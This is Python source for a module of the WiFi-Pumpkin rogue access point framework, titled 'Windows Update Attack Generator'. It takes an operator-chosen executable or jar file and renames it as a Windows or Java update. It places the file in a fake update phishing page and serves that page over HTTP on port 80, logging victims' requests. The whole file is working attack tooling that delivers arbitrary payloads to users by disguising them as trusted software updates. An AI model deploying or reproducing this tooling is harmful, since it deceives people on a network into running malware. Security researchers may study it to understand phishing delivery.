from os import path,remove
from datetime import date
from shutil import copyfile
from core.loaders.models.PackagesUI import *
from modules.servers.ServerHTTP import ThreadHTTPServerPhishing

"""
Description:
    This program is a module for wifi-pumpkin.py file which includes functionality
    for Fake update windows.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""
threadloading = {'server':[]}

class frm_update_attack(PumpkinModule):
    def __init__(self, parent=None):
        super(frm_update_attack, self).__init__(parent)
        self.setWindowTitle('Windows Update Attack Generator ')
        self.setWindowIcon(QIcon('icons/icon.ico'))
        self.loadtheme(self.configure.XmlThemeSelected())
        self.Main       = QVBoxLayout()
        self.path_file  = None
        self.GUI()

    def closeEvent(self, event):
        reply = QMessageBox.question(self, 'About Exit',"Are you sure you want to quit?", QMessageBox.Yes |
            QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            event.accept()
            global threadloading
            for i in threadloading['server']:i.stop()
            self.removefiles()
            return
        event.ignore()

    def GUI(self):
        self.form   = QFormLayout()
        self.formfinal = QFormLayout()
        self.grid1  = QGridLayout()
        self.path   = QLineEdit(self)
        self.logBox = QListWidget(self)
        self.status = QStatusBar()
        self.status.setFixedHeight(15)
        self.path.setFixedHeight(28)
        self.path.setFixedWidth(300)
        #combobox
        self.cb_interface = QComboBox(self)
        self.refresh_interface(self.cb_interface)


        #group box
        self.layoutPage = QFormLayout()
        self.GroupPages = QGroupBox(self)
        self.GroupPages.setTitle('Phishing Page:')
        self.GroupPages.setLayout(self.layoutPage)

        self.layoutAdpter = QFormLayout()
        self.GroupAdpter = QGroupBox(self)
        self.GroupAdpter.setTitle('Network Adapter:')
        self.GroupAdpter.setLayout(self.layoutAdpter)

        self.layoutLogBox = QFormLayout()
        self.GroupLogger = QGroupBox(self)
        self.GroupLogger.setTitle('Log::Requests:')
        self.GroupLogger.setLayout(self.layoutLogBox)

        # buttons
        self.btn_open         = QPushButton("...")
        self.btn_stop         = QPushButton("Stop Server")
        self.btn_reload       = QPushButton("Refresh")
        self.btn_start_server = QPushButton("Start Server")
        # size
        self.btn_open.setMaximumWidth(90)
        self.btn_stop.setFixedHeight(50)
        self.btn_start_server.setFixedHeight(50)
        self.btn_stop.setEnabled(False)
        #icons
        self.btn_open.setIcon(QIcon("icons/open.png"))
        self.btn_stop.setIcon(QIcon("icons/Stop.png"))
        self.btn_reload.setIcon(QIcon("icons/refresh.png"))
        self.btn_start_server.setIcon(QIcon("icons/start.png"))

        # connect buttons
        self.btn_open.clicked.connect(self.getpath)
        self.btn_reload.clicked.connect(self.inter_get)
        self.btn_start_server.clicked.connect(self.server_start)
        self.btn_stop.clicked.connect(self.stop_attack)

        # radionButton
        self.rb_windows = QRadioButton("Windows Update",self)
        self.rb_windows.setIcon(QIcon("icons/winUp.png"))
        self.rb_adobe = QRadioButton("Adobe Update", self)
        self.rb_adobe.setIcon(QIcon("icons/adobe.png"))
        self.rb_java = QRadioButton("Java Update", self)
        self.rb_java.setIcon(QIcon("icons/java.png"))
        self.rb_adobe.setEnabled(False)
        self.layoutPage.addRow(self.rb_windows)
        self.layoutPage.addRow(self.rb_java)
        self.layoutPage.addRow(self.rb_adobe)

        # check interface
        self.layoutAdpter.addRow(self.cb_interface)
        self.layoutAdpter.addRow(self.btn_reload)

        self.layoutLogBox.addRow(self.logBox)

        self.layoutsplit = QHBoxLayout()
        self.layoutsplit.addWidget(self.GroupPages)
        self.layoutsplit.addWidget(self.GroupAdpter)


        #grid 2
        self.grid1.addWidget(self.btn_start_server,0,2)
        self.grid1.addWidget(self.btn_stop,0,4)

        #form add layout
        self.form.addRow(self.path,self.btn_open)
        self.formfinal.addRow(self.GroupLogger)
        self.formfinal.addRow(self.grid1)
        self.formfinal.addRow(self.status)
        self.Main.addLayout(self.form)
        self.Main.addLayout(self.layoutsplit)
        self.Main.addLayout(self.formfinal)
        self.setLayout(self.Main)

    def removefiles(self):
        pathList = ['templates/Update/Windows_Update/index.html',
        'templates/Update/Windows_Update/windows-update.exe',
        'templates/Update/Java_Update/index.html',
        'templates/Update/Java_Update/java-update.exe']
        for i in pathList:
            if path.isfile(i):remove(i)

    def stop_attack(self):
        for i in threadloading['server']:i.stop()
        threadloading['server'] = []
        self.removefiles()
        self.logBox.clear()
        self.status.showMessage('')
        self.btn_stop.setEnabled(False)

    def inter_get(self):
        self.refresh_interface(self.cb_interface)

    def refresh_interface(self,cb):
        cb.clear()
        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if n[i] != '':
                cb.addItem(n[i])

    def logPhising(self,log):
        self.logBox.addItem(log)
        self.logBox.scrollToBottom()


    def SettingsPage(self,pathPage,directory,filename,info):
        try:
            if path.isfile(directory+filename):
                remove(directory+filename)
            copyfile(self.path_file,directory+filename)
        except OSError,e:
            return QMessageBox.warning(self,'error',e)
        file_html = open(pathPage,'r').read()
        if info:
            settings_html = file_html.replace('KBlenfile',
            str(Refactor.getSize(self.path_file))+'KB')
        else:
            settings_html = file_html.replace('{{Date}}',
            str(date.today().strftime("%A %d. %B %Y")))
        if path.isfile(directory+'index.html'):
            remove(directory+'index.html')
        confFile = open(directory+'index.html','w')
        confFile.write(settings_html)
        confFile.close()
        ip = Refactor.get_Ipaddr(str(self.cb_interface.currentText()))
        if ip == None:
            return QMessageBox.warning(self, 'IP not found',
            'The IP Address was not found on the selected Network Adapter.')
        self.btn_start_server.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.threadServer(directory,ip)

    def server_start(self):
        if len(self.path.text()) <= 0:
            return QMessageBox.information(self, 'Path Error', 'Error in the file path.')
        if self.rb_windows.isChecked():
            return self.SettingsPage('templates/Update/Settings_WinUpdate.html',
            'templates/Update/Windows_Update/','windows-update.exe',True)
        elif self.rb_java.isChecked():
            return self.SettingsPage('templates/Update/Settings_java.html',
            'templates/Update/Java_Update/','java-update.exe',False)

        return QMessageBox.information(self, 'Phishing Settings', 'Please select an option in the Phishing page:')

    def threadServer(self,directory,ip):
        global threadloading
        self.threadHTTP = ThreadHTTPServerPhishing(80,directory)
        self.threadHTTP.request.connect(self.logPhising)
        threadloading['server'].append(self.threadHTTP)
        self.threadHTTP.start()
        self.status.showMessage("::Started >> [HTTP::"+ip+" ::Port 80]")

    def getpath(self):
        files_types = "exe (*.exe);;jar (*.jar)"
        file = QFileDialog.getOpenFileName(self, 'Open Executable file','',files_types)
        if len(file) > 0:
            self.path_file = file
            self.path.setText(file)
